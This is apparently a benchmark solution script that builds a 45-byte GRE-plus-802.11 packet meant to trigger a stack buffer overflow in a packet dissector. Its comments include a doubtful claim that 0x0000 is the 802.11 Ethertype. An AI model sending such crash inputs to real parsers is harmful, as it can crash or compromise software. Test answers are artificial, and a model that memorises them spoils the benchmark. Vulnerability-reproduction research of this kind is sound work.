import os
import tarfile
import tempfile
import struct
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # GRE header structure:
        # bits 0-12: flags
        # bits 13-15: version (0)
        # bits 16-31: protocol type (0x0000 for 802.11)
        
        # Minimal GRE header for this vulnerability:
        # - Flags: 0 (no checksum, no key, no sequence)
        # - Version: 0
        # - Protocol: 0x0000 (Ethertype for 802.11)
        gre_header = struct.pack('>HH', 0x0000, 0x0000)  # 4 bytes
        
        # The vulnerability is that the 802.11 dissector expects radio information
        # (pseudoheader) but gets GRE flags/version instead.
        # We need to trigger a stack buffer overflow in the 802.11 dissector.
        # The ground truth length is 45 bytes, so we need 41 bytes of payload.
        
        # Create a malformed 802.11 frame that will cause buffer overflow
        # when processed with the wrong pseudoheader
        
        # 802.11 frame structure (minimal):
        # - Frame Control: 2 bytes
        # - Duration: 2 bytes  
        # - Address1: 6 bytes
        # - Address2: 6 bytes
        # - Address3: 6 bytes
        # - Sequence Control: 2 bytes
        # - Frame Body: variable
        
        # We'll create a frame that overflows a buffer when radio header is missing
        frame_control = 0x0080  # Data frame
        duration = 0x0000
        addr1 = b'\xff\xff\xff\xff\xff\xff'  # Broadcast
        addr2 = b'\x00\x00\x00\x00\x00\x01'
        addr3 = b'\x00\x00\x00\x00\x00\x02'
        seq_ctrl = 0x0000
        
        # Frame body designed to trigger overflow
        # 41 bytes total: 2+2+6+6+6+2 = 24 bytes header, so 17 bytes body
        body_length = 17
        frame_body = b'A' * body_length  # Fill with pattern
        
        # Construct the 802.11 frame
        frame_parts = [
            struct.pack('<H', frame_control),
            struct.pack('<H', duration),
            addr1,
            addr2, 
            addr3,
            struct.pack('<H', seq_ctrl),
            frame_body
        ]
        
        # Combine GRE header and 802.11 frame
        poc = gre_header + b''.join(frame_parts)
        
        # Verify length matches ground truth
        assert len(poc) == 45, f"Expected 45 bytes, got {len(poc)}"
        
        return poc